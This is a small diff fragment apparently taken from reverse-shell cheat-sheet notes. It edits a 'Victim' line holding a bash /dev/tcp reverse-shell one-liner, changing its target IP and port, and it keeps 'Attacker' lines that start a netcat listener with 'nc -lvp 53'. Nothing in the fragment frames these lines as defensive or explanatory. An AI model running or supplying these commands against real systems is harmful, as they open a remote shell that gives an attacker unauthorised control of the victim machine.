@@ -11,7 +11,7 @@ nc -lvp 53
 
 # 2)
 --- Victim: ---
-bash -i >& /dev/tcp/192.168.29.31/2020 0>&1
+bash -i >& /dev/tcp/10.11.0.42/4446 0>&1
 -- Attacker: ---
 nc -lvp 53
 
